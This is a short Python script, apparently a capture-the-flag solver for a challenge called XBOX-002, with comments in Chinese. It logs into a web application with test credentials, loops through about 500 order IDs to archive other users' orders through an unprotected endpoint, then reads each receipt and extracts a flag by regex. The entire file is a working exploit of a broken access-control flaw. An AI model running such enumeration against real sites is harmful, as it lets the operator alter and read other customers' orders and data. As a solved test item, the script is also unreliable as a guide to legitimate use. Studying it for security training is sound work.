# coding:utf-8
import requests
import re
import sys

'''
@文件命名：XBOX-002
@使用方式: python 002.py url
@简述思路: 登录后枚举订单ID,归档订单,然后访问归档订单的收据获取flag
'''


def Scan(url):
    flag = ""
    try:
        BASE_URL = url.rstrip('/')
        USERNAME = "test"
        PASSWORD = "test"
        
        session = requests.Session()
        
        # 登录 - 提交用户名
        login_data = {"username": USERNAME}
        session.post(f"{BASE_URL}/", data=login_data)
        
        # 登录 - 提交密码
        password_data = {"password": PASSWORD}
        session.post(f"{BASE_URL}/password/{USERNAME}", data=password_data)
        
        # 枚举并归档订单
        archived_orders = []
        for order_id in range(300000, 300501):
            archive_url = f"{BASE_URL}/order/{order_id}/archive"
            response = session.get(archive_url)
            if response.status_code == 200:
                archived_orders.append(order_id)
        
        # 获取每个归档订单的收据
        for target_order_id in archived_orders:
            receipt_url = f"{BASE_URL}/order/{target_order_id}/receipt"
            response = session.get(receipt_url)
            
            if response.status_code == 200:
                content = response.text
                
                # 匹配flag{***}或FLAG{***}格式
                flag_pattern = r"[Ff][Ll][Aa][Gg]\{[^}]+\}"
                flag_match = re.search(flag_pattern, content)
                
                if flag_match:
                    flag = flag_match.group(0)
                    return flag
                
                # 备用方案:匹配UUID格式
                uuid_pattern = r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
                uuid_match = re.search(uuid_pattern, content, re.IGNORECASE)
                
                if uuid_match:
                    flag = f"flag{{{uuid_match.group(0)}}}"
                    return flag
                    
    except Exception as e:
        pass
    
    return flag


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))